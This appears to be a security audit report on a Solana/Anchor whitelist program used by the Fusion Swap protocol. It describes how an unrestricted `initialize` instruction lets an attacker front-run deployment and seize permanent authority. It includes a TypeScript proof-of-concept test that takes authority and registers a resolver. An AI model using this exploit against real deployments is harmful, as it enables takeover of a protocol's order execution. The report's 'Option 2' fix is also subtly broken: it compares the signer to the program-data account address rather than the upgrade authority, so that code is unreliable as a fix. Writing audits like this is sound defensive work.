# Audit Report

## Title
Whitelist Initialization Front-Running Allows Complete Protocol Takeover

## Summary
The `initialize` instruction in the whitelist program lacks authorization checks, allowing any attacker to front-run the legitimate initialization transaction and permanently set themselves as the whitelist authority. This grants the attacker complete control over resolver registration, effectively monopolizing or disabling the entire Fusion Swap protocol's order execution system.

## Finding Description

The whitelist program's `initialize` function is responsible for setting the authority that controls which resolvers can fill orders in the Fusion Swap protocol. However, this critical initialization function contains a severe vulnerability: **it has no validation whatsoever to restrict who can call it**. [1](#0-0) 

The function simply accepts any signer as the authority and stores their public key in the whitelist state. The `Initialize` account validation structure provides no constraints on who can be the authority: [2](#0-1) 

The authority account is merely marked as `Signer<'info>` with no additional constraints like `constraint = authority.key() == EXPECTED_AUTHORITY`. The PDA for the whitelist state is derived using only a constant seed: [3](#0-2) 

This makes the whitelist state address completely deterministic and publicly calculable. The `init` constraint ensures the account can only be initialized once, meaning **the first caller permanently becomes the authority with no ability to override or reset**.

**Attack Flow:**

1. The 1inch team deploys the whitelist program to mainnet
2. An attacker monitors the blockchain for the program deployment
3. Before the legitimate team can initialize, the attacker submits their own `initialize` transaction with higher priority fees
4. The attacker's transaction executes first, setting `whitelist_state.authority = attacker.key()`
5. The legitimate initialization transaction from 1inch fails because the account already exists (Anchor's `init` constraint prevents re-initialization)
6. The attacker now permanently controls the whitelist authority

**Impact on Protocol Security:**

The whitelist authority has complete control over resolver registration through the `register` and `deregister` functions: [4](#0-3) [5](#0-4) 

Both functions enforce that only the current authority can register or deregister resolvers. This control is critical because the Fusion Swap protocol requires all order fillers to be whitelisted. The `fill` instruction validates this: [6](#0-5) 

Similarly, the `cancel_by_resolver` instruction also requires whitelist validation: [7](#0-6) 

Without a valid `resolver_access` PDA from the whitelist program, no one can fill orders or perform resolver-based cancellations. The attacker who controls the whitelist authority effectively controls the entire order execution system.

## Impact Explanation

**Severity: CRITICAL**

This vulnerability results in complete protocol compromise with catastrophic consequences:

1. **Total Access Control Takeover**: The attacker becomes the permanent whitelist authority. The `set_authority` function requires the current authority's signature, which the attacker now controls: [8](#0-7) [9](#0-8) 

2. **Protocol Monopolization**: The attacker can whitelist only themselves (or their controlled addresses) as resolvers, monopolizing all order fills across the entire protocol. They can extract maximum value from every order by filling at the least favorable rates within the Dutch auction curve.

3. **Protocol Shutdown**: Alternatively, the attacker can deregister all legitimate resolvers and refuse to whitelist anyone, effectively shutting down the entire Fusion Swap protocol. All existing orders would become unfillable (except through maker cancellation), and no new orders could be executed.

4. **Difficult Recovery**: While the protocol team could potentially upgrade the program using the upgrade authority, this would be a reactive measure after the attack has already occurred. By that time:
   - Users may have created orders that cannot be filled
   - Reputation damage has occurred
   - The attack window still exists during any redeployment
   - Emergency response and upgrade procedures would be required

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited for the following reasons:

1. **Public Knowledge**: Solana program deployments are entirely public and transparent. The program ID and all account addresses can be calculated by anyone monitoring the blockchain.

2. **Trivial Exploitation**: The attack requires only basic Solana development knowledge:
   - Calculate the deterministic whitelist state PDA
   - Construct a simple `initialize` transaction
   - Submit with higher priority fees
   
3. **No Technical Barriers**: The attacker needs only:
   - A Solana wallet with minimal SOL for transaction fees
   - Basic ability to construct and submit transactions
   - No special permissions, signatures, or access

4. **Critical Time Window**: There is an unavoidable window between program deployment and initialization during which the vulnerability is exploitable. On Solana, these are necessarily separate transactions, creating this exposure.

5. **High Economic Incentive**: The potential reward is enormous - complete control over a DeFi protocol that could handle significant trading volume. An attacker could either:
   - Extract maximum value by monopolizing order fills
   - Hold the protocol hostage for ransom
   - Cause maximum disruption to damage 1inch's reputation

## Recommendation

Add an authorization constraint to the `initialize` instruction to ensure only the legitimate protocol authority can initialize the whitelist state. This can be accomplished in several ways:

**Option 1: Hardcoded Authority (Simplest)**
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(
        mut,
        constraint = authority.key() == EXPECTED_AUTHORITY_PUBKEY @ WhitelistError::Unauthorized
    )]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**Option 2: Use Program Upgrade Authority**
Derive the expected authority from the program's upgrade authority to tie initialization to program ownership:

```rust
#[account(
    mut,
    constraint = authority.key() == program.programdata_address()?.unwrap() @ WhitelistError::Unauthorized
)]
pub authority: Signer<'info>,
```

**Option 3: Two-Step Initialization**
Use a deployment-time parameter to set the expected authority, preventing front-running while maintaining flexibility.

Additionally, consider implementing an atomic deployment strategy where the program deployment and initialization occur in rapid succession with maximum priority fees to minimize the attack window.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../../target/types/whitelist";
import { expect } from "chai";

describe("Whitelist Initialization Front-Running", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.Whitelist as Program<Whitelist>;

  it("Demonstrates front-running vulnerability", async () => {
    // Attacker generates a keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund the attacker
    const airdropSig = await provider.connection.requestAirdrop(
      attacker.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdropSig);

    // Attacker calculates the deterministic whitelist state PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    // Attacker front-runs initialization by calling it first
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify the attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(
      whitelistStatePDA
    );
    expect(whitelistState.authority.toString()).to.equal(
      attacker.publicKey.toString()
    );

    // Legitimate team's initialization attempt will fail
    const legitimateAuthority = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );

    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      // Should not reach here
      expect.fail("Initialization should have failed");
    } catch (error) {
      // Expected: Account already initialized
      expect(error.toString()).to.include("already in use");
    }

    // Attacker now has complete control over resolver registration
    const resolver = anchor.web3.Keypair.generate();
    
    // Attacker can register any resolver
    await program.methods
      .register(resolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    // Legitimate authority cannot register resolvers
    try {
      await program.methods
        .register(anchor.web3.Keypair.generate().publicKey)
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      expect.fail("Should not be able to register");
    } catch (error) {
      expect(error.toString()).to.include("Unauthorized");
    }

    console.log("✓ Attacker successfully front-ran initialization");
    console.log("✓ Attacker has permanent control over whitelist");
    console.log("✓ Legitimate authority cannot recover control");
  });
});
```

## Notes

This vulnerability represents a critical flaw in the deployment and initialization process of the whitelist program. While the protocol team could potentially mitigate the impact through program upgrades, the vulnerability creates an unavoidable attack window during initial deployment that could result in complete protocol compromise before any defensive measures can be taken.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L36-40)
```rust
    pub fn set_authority(ctx: Context<SetAuthority>, new_authority: Pubkey) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = new_authority;
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L112-123)
```rust
pub struct SetAuthority<'info> {
    #[account(mut)]
    pub current_authority: Signer<'info>,
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L648-653)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```
